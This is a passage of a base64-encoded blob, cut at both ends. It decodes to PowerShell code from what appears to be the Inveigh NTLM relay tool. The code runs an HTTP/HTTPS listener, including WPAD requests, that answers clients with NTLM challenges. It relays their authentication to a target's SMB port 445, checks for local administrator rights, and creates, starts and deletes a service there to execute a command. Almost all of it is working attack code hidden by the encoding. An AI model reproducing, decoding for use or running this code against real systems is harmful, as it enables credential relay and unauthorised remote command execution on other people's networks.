gfQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc3RyZWFtLndyaXRlKCRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kLCAwLCAkU01CX3JlbGF5X2V4ZWN1dGVfc2VuZC5sZW5ndGgpCiAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYoJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV90aW1lb3V0ID0gbmV3LXRpbWVzcGFuIC1TZWNvbmRzICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0CiAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc3RvcHdhdGNoID0gW2RpYWdub3N0aWNzLnN0b3B3YXRjaF06OlN0YXJ0TmV3KCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgd2hpbGUoISRTTUJfcmVsYXlfZXhlY3V0ZV9zdHJlYW0uRGF0YUF2YWlsYWJsZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBpZigkU01CX3JlbGF5X2V4ZWN1dGVfc3RvcHdhdGNoLmVsYXBzZWQgLWdlICRTTUJfcmVsYXlfZXhlY3V0ZV90aW1lb3V0KQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIlNNQiByZWxheSB0YXJnZXQgZGlkbid0IHJlc3BvbmQgd2l0aGluICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0IHNlY29uZHMiKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgdGFyZ2V0IGRpZG4ndCByZXNwb25kIHdpdGhpbiAkU01CUmVsYXlOZXR3b3JrVGltZW91dCBzZWNvbmRzIildKQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2ZhaWxlZCA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrIFNNQl9yZWxheV9leGVjdXRlX2xvb3AKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICgkayAtZXEgNSkgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zdHJlYW0uUmVhZCgkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXMsIDAsICRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlcy5sZW5ndGgpCiAgICAgICAgICAgICAgICAkU01CX2NvbnRleHRfaGFuZGxlciA9ICRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlc1s4OC4uMTA3XQoKICAgICAgICAgICAgICAgIGlmKChbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlc1sxMDguLjExMV0pIC1lcSAnMDAtMDAtMDAtMDAnKSAtYW5kIChbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY29udGV4dF9oYW5kbGVyKSAtbmUgJzAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwJykpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIiRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGlzIGEgbG9jYWwgYWRtaW5pc3RyYXRvciBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGlzIGEgbG9jYWwgYWRtaW5pc3RyYXRvciBvbiAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXNbMTA4Li4xMTFdKSAtZXEgJzA1LTAwLTAwLTAwJykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaXMgbm90IGEgbG9jYWwgYWRtaW5pc3RyYXRvciBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGlzIG5vdCBhIGxvY2FsIGFkbWluaXN0cmF0b3Igb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQlJlbGF5X2ZhaWxlZF9saXN0ICs9ICIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyAkU01CUmVsYXlUYXJnZXQiCiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9mYWlsZWQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZmFpbGVkID0gJHRydWUKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgoJGsgLWVxIDcpIC1vciAoJGsgLWVxIDkpIC1vciAoJGsgLWVxIDExKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3N0cmVhbS5SZWFkKCRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlcywgMCwgJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzLmxlbmd0aCkKCiAgICAgICAgICAgICAgICBzd2l0Y2goJGspCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgNyB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY29udGV4dF9oYW5kbGVyID0gJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzWzkyLi4xMTFdCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9lcnJvcl9tZXNzYWdlID0gIlNlcnZpY2UgY3JlYXRpb24gZmF1bHQgY29udGV4dCBtaXNtYXRjaCIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgMTEgewogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfZXJyb3JfbWVzc2FnZSA9ICJTZXJ2aWNlIHN0YXJ0IGZhdWx0IGNvbnRleHQgbWlzbWF0Y2giCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIDEzIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX2Vycm9yX21lc3NhZ2UgPSAiU2VydmljZSBkZWxldGlvbiBmYXVsdCBjb250ZXh0IG1pc21hdGNoIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NvbnRleHRfaGFuZGxlclswLi4zXSkgLW5lICcwMC0wMC0wMC0wMCcpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9mYWlsZWQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzWzg4Li45MV0pIC1lcSAnMWEtMDAtMDAtMWMnKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCIkU01CX3JlbGF5X2V4ZWN1dGVfZXJyb3JfbWVzc2FnZSBzZXJ2aWNlIG9uICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJFNNQl9yZWxheV9leGVjdXRlX2Vycm9yIG9uICRTTUJSZWxheVRhcmdldCIpXSkKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2ZhaWxlZCA9ICR0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gICAgICAgIAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zdHJlYW0uUmVhZCgkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXMsIDAsICRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlcy5sZW5ndGgpICAgIAogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBpZigoISRTTUJfcmVsYXlfZmFpbGVkKSAtYW5kICgkayAtZXEgNykpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCJTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgY3JlYXRlZCBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHNlcnZpY2UgJFNNQl9zZXJ2aWNlIGNyZWF0ZWQgb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZigoISRTTUJfcmVsYXlfZmFpbGVkKSAtYW5kICgkayAtZXEgOSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCJTTUIgcmVsYXkgY29tbWFuZCBsaWtlbHkgZXhlY3V0ZWQgb24gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBjb21tYW5kIGxpa2VseSBleGVjdXRlZCBvbiAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYoJFNNQlJlbGF5QXV0b0Rpc2FibGUgLWVxICd5JykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXkgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiU01CIHJlbGF5IGF1dG8gZGlzYWJsZWQgZHVlIHRvIHN1Y2Nlc3MiKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBhdXRvIGRpc2FibGVkIGR1ZSB0byBzdWNjZXNzIildKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZigoISRTTUJfcmVsYXlfZmFpbGVkKSAtYW5kICgkayAtZXEgMTEpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiU01CIHJlbGF5IHNlcnZpY2UgJFNNQl9zZXJ2aWNlIGRlbGV0ZWQgb24gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBzZXJ2aWNlICRTTUJfc2VydmljZSBkZWxldGVkIG9uICRTTUJSZWxheVRhcmdldCIpXSkKICAgICAgICAgICAgICAgIH0gICAKICAgICAgICAgICAgCiAgICAgICAgICAgIFtCeXRlW11dJFNNQl9yZWxheV9leGVjdXRlX1JlYWRBbmRSZXF1ZXN0ID0gKDB4MDAsMHgwMCwweDAwLDB4MzcsMHhmZiwweDUzLDB4NGQsMHg0MiwweDJlLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxOCwweDA1LDB4MjgpYAogICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDA4KWAKICAgICAgICAgICAgICAgICsgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlc2AKICAgICAgICAgICAgICAgICsgJFNNQl91c2VyX0lEYAogICAgICAgICAgICAgICAgKyAkU01CX211bHRpcGxleF9JRGAKICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwYSwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0MCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NTgsMHgwMiwweDU4LDB4MDIsMHhmZiwweGZmLDB4ZmYsMHhmZiwweDAwLDB4MDAsMHgwMCwweDAwKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYoJFNNQl9yZWxheV9mYWlsZWQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCJTTUIgcmVsYXkgZmFpbGVkIG9uICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgZmFpbGVkIG9uICRTTUJSZWxheVRhcmdldCIpXSkKICAgICAgICAgICAgICAgIEJSRUFLIFNNQl9yZWxheV9leGVjdXRlX2xvb3AKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJGsrKwogICAgICAgIH0KICAgICAgICAKICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgCiAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQogICAgICAgIAogICAgfQp9CgojIEhUVFAvSFRUUFMgU2VydmVyIFNjcmlwdEJsb2NrIC0gSFRUUC9IVFRQUyBsaXN0ZW5lcgokSFRUUF9zY3JpcHRibG9jayA9IAp7IAogICAgcGFyYW0gKCRTTUJSZWxheVRhcmdldCwkU01CUmVsYXlDb21tYW5kLCRTTUJSZWxheVVzZXJuYW1lcywkU01CUmVsYXlBdXRvRGlzYWJsZSwkU01CUmVsYXlOZXR3b3JrVGltZW91dCwkTWFjaGluZUFjY291bnRzLCRXUEFEQXV0aCkKCiAgICBGdW5jdGlvbiBOVExNQ2hhbGxlbmdlQmFzZTY0CiAgICB7CgogICAgICAgICRIVFRQX3RpbWVzdGFtcCA9IEdldC1EYXRlCiAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gJEhUVFBfdGltZXN0YW1wLlRvRmlsZVRpbWUoKQogICAgICAgICRIVFRQX3RpbWVzdGFtcCA9IFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJEhUVFBfdGltZXN0YW1wKSkKICAgICAgICAkSFRUUF90aW1lc3RhbXAgPSAkSFRUUF90aW1lc3RhbXAuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0eyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQoKICAgICAgICBpZigkSW52ZWlnaC5jaGFsbGVuZ2UpCiAgICAgICAgewogICAgICAgICAgICAkSFRUUF9jaGFsbGVuZ2UgPSAkSW52ZWlnaC5jaGFsbGVuZ2UKICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlX2J5dGVzID0gJEludmVpZ2guY2hhbGxlbmdlLkluc2VydCgyLCctJykuSW5zZXJ0KDUsJy0nKS5JbnNlcnQoOCwnLScpLkluc2VydCgxMSwnLScpLkluc2VydCgxNCwnLScpLkluc2VydCgxNywnLScpLkluc2VydCgyMCwnLScpCiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZV9ieXRlcyA9ICRIVFRQX2NoYWxsZW5nZV9ieXRlcy5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7IFtDSEFSXVtDT05WRVJUXTo6dG9pbnQxNigkXywxNil9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZV9ieXRlcyA9IFtTdHJpbmddKDEuLjggfCBGb3JFYWNoLU9iamVjdCB7InswOlgyfSIgLWYgKEdldC1SYW5kb20gLU1pbmltdW0gMSAtTWF4aW11bSAyNTUpfSkKICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlID0gJEhUVFBfY2hhbGxlbmdlX2J5dGVzIC1yZXBsYWNlICcgJywgJycKICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlX2J5dGVzID0gJEhUVFBfY2hhbGxlbmdlX2J5dGVzLlNwbGl0KCIgIikgfCBGb3JFYWNoLU9iamVjdHsgW0NIQVJdW0NPTlZFUlRdOjp0b2ludDE2KCRfLDE2KX0KICAgICAgICB9CgogICAgICAgICRpbnZlaWdoLkhUVFBfY2hhbGxlbmdlX3F1ZXVlLkFkZCgkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LlBvcnQgKyAnLCcgKyAkSFRUUF9jaGFsbGVuZ2UpIHxPdXQtTnVsbAoKICAgICAgICBbYnl0ZVtdXSRIVFRQX05UTE1fYnl0ZXMgPSAoMHg0ZSwweDU0LDB4NGMsMHg0ZCwweDUzLDB4NTMsMHg1MCwweDAwLDB4MDIsMHgwMCwweDAwLDB4MDAsMHgwNiwweDAwLDB4MDYsMHgwMCwweDM4LDB4MDAsMHgwMCwweDAwLDB4MDUsMHg4MiwweDg5LDB4YTIpYAogICAgICAgICAgICArICRIVFRQX2NoYWxsZW5nZV9ieXRlc2AKICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4ODIsMHgwMCwweDgyLDB4MDAsMHgzZSwweDAwLDB4MDAsMHgwMCwweDA2LDB4MDEsMHhiMSwweDFkLDB4MDAsMHgwMCwweDAwLDB4MGYsMHg0YywweDAwLDB4NDEsMHgwMCwweDQyLDB4MDApYAogICAgICAgICAgICArICgweDAyLDB4MDAsMHgwNiwweDAwLDB4NGMsMHgwMCwweDQxLDB4MDAsMHg0MiwweDAwLDB4MDEsMHgwMCwweDEwLDB4MDAsMHg0OCwweDAwLDB4NGYsMHgwMCwweDUzLDB4MDAsMHg1NCwweDAwLDB4NGUsMHgwMCwweDQxLDB4MDAsMHg0ZCwweDAwLDB4NDUsMHgwMClgCiAgICAgICAgICAgICsgKDB4MDQsMHgwMCwweDEyLDB4MDAsMHg2YywweDAwLDB4NjEsMHgwMCwweDYyLDB4MDAsMHgyZSwweDAwLDB4NmMsMHgwMCwweDZmLDB4MDAsMHg2MywweDAwLDB4NjEsMHgwMCwweDZjLDB4MDAsMHgwMywweDAwLDB4MjQsMHgwMCwweDY4LDB4MDAsMHg2ZiwweDAwKWAKICAgICAgICAgICAgKyAoMHg3MywweDAwLDB4NzQsMHgwMCwweDZlLDB4MDAsMHg2MSwweDAwLDB4NmQsMHgwMCwweDY1LDB4MDAsMHgyZSwweDAwLDB4NmMsMHgwMCwweDYxLDB4MDAsMHg2MiwweDAwLDB4MmUsMHgwMCwweDZjLDB4MDAsMHg2ZiwweDAwLDB4NjMsMHgwMCwweDYxLDB4MDApYAogICAgICAgICAgICArICgweDZjLDB4MDAsMHgwNSwweDAwLDB4MTIsMHgwMCwweDZjLDB4MDAsMHg2MSwweDAwLDB4NjIsMHgwMCwweDJlLDB4MDAsMHg2YywweDAwLDB4NmYsMHgwMCwweDYzLDB4MDAsMHg2MSwweDAwLDB4NmMsMHgwMCwweDA3LDB4MDAsMHgwOCwweDAwKWAKICAgICAgICAgICAgKyAkSFRUUF90aW1lc3RhbXBgCiAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwYSwweDBhKQoKICAgICAgICAkTlRMTV9jaGFsbGVuZ2VfYmFzZTY0ID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEhUVFBfTlRMTV9ieXRlcykKICAgICAgICAkTlRMTSA9ICdOVExNICcgKyAkTlRMTV9jaGFsbGVuZ2VfYmFzZTY0CiAgICAgICAgJE5UTE1fY2hhbGxlbmdlID0gJEhUVFBfY2hhbGxlbmdlCgogICAgICAgIFJldHVybiAkTlRMTQoKICAgIH0KICAgIAogICAgd2hpbGUgKCRpbnZlaWdoLnJlbGF5X3J1bm5pbmcpCiAgICB7CiAgICAgICAgJGludmVpZ2guY29udGV4dCA9ICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuR2V0Q29udGV4dCgpIAogICAgICAgICRpbnZlaWdoLnJlcXVlc3QgPSAkaW52ZWlnaC5jb250ZXh0LlJlcXVlc3QKICAgICAgICAkaW52ZWlnaC5yZXNwb25zZSA9ICRpbnZlaWdoLmNvbnRleHQuUmVzcG9uc2UKICAgICAgICAkaW52ZWlnaC5tZXNzYWdlID0gJycKICAgICAgICAKICAgICAgICAkTlRMTSA9ICdOVExNJwogICAgICAgIAogICAgICAgIGlmKCRpbnZlaWdoLnJlcXVlc3QuSXNTZWN1cmVDb25uZWN0aW9uKQogICAgICAgIHsKICAgICAgICAgICAgJEhUVFBfdHlwZSA9ICJIVFRQUyIKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJEhUVFBfdHlwZSA9ICJIVFRQIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBpZiAoKCRpbnZlaWdoLnJlcXVlc3QuUmF3VXJsIC1tYXRjaCAnL3dwYWQuZGF0JykgLWFuZCAoJFdQQURBdXRoIC1lcSAnQW5vbnltb3VzJykpCiAgICAgICAgewogICAgICAgICAgICAkaW52ZWlnaC5yZXNwb25zZS5TdGF0dXNDb2RlID0gMjAwCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLnJlc3BvbnNlLlN0YXR1c0NvZGUgPSA0MDEKICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgIFtzdHJpbmddJGF1dGhlbnRpY2F0aW9uX2hlYWRlciA9ICRpbnZlaWdoLnJlcXVlc3QuaGVhZGVycy5nZXR2YWx1ZXMoJ0F1dGhvcml6YXRpb24nKQogICAgICAgIAogICAgICAgIGlmKCRhdXRoZW50aWNhdGlvbl9oZWFkZXIuc3RhcnRzd2l0aCgnTlRMTSAnKSkKICAgICAgICB7CiAgICAgICAgICAgICRhdXRoZW50aWNhdGlvbl9oZWFkZXIgPSAkYXV0aGVudGljYXRpb25faGVhZGVyIC1yZXBsYWNlICdOVExNICcsJycKICAgICAgICAgICAgW2J5dGVbXV0gJEhUVFBfcmVxdWVzdF9ieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGF1dGhlbnRpY2F0aW9uX2hlYWRlcikKICAgICAgICAgICAgJGludmVpZ2gucmVzcG9uc2UuU3RhdHVzQ29kZSA9IDQwMQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCRIVFRQX3JlcXVlc3RfYnl0ZXNbOF0gLWVxIDEpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgcmVxdWVzdCBmb3IgIiArICRpbnZlaWdoLnJlcXVlc3QuUmF3VXJsICsgIiByZWNlaXZlZCBmcm9tICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIHJlcXVlc3QgZm9yICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJhd1VybCArICIgcmVjZWl2ZWQgZnJvbSAiICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzKV0pCgogICAgICAgICAgICAgICAgaWYoKCRpbnZlaWdoLlNNQl9yZWxheSkgLWFuZCAoJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwIC1lcSAwKSAtYW5kICgkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MgLW5lICRTTUJSZWxheVRhcmdldCkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCIkSFRUUF90eXBlIHRvIFNNQiByZWxheSB0cmlnZ2VyZWQgYnkgIiArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcyArICIgYXQgJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykiKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgdG8gU01CIHJlbGF5IHRyaWdnZXJlZCBieSAiICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzKV0pCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIkdyYWJiaW5nIGNoYWxsZW5nZSBmb3IgcmVsYXkgZnJvbSAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEdyYWJiaW5nIGNoYWxsZW5nZSBmb3IgcmVsYXkgZnJvbSAiICsgJFNNQlJlbGF5VGFyZ2V0KV0pCiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3NvY2tldC5jb25uZWN0KCRTTUJSZWxheVRhcmdldCwiNDQ1IikKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZighJFNNQl9yZWxheV9zb2NrZXQuY29ubmVjdGVkKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmV